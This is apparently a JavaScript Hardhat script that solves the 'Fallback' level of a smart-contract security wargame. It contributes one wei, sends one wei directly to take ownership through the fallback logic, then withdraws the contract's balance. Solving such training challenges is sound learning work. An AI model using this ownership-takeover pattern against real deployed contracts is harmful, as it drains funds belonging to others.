const {
	FALLBACK_INSTANCE_ADDRESS,
	logStartingLevel,
	logSuccessfullyLevel,
	logInstanceAddressIsNull,
	logInstanceAddress,
	logTransactionLink,
} = require('./utils');

async function main(levelName = 'Fallback') {
	logStartingLevel(levelName);

	if (!FALLBACK_INSTANCE_ADDRESS) {
		logInstanceAddressIsNull(levelName);
		return;
	}
	logInstanceAddress(levelName, FALLBACK_INSTANCE_ADDRESS);

	const [attacker] = await ethers.getSigners();
	const instance = await ethers.getContractAt("Fallback", FALLBACK_INSTANCE_ADDRESS);

	let tx = await instance.connect(attacker).contribute({value: ethers.utils.parseUnits("1", "wei")});
	logTransactionLink(tx.hash);
	await tx.wait(1);

	tx = await attacker.sendTransaction({to: FALLBACK_INSTANCE_ADDRESS, value: ethers.utils.parseUnits("1", "wei")});
	logTransactionLink(tx.hash);
	await tx.wait(1);

	tx = await instance.connect(attacker).withdraw();
	logTransactionLink(tx.hash);
	await tx.wait(1);

	logSuccessfullyLevel(levelName);
}

module.exports = main;
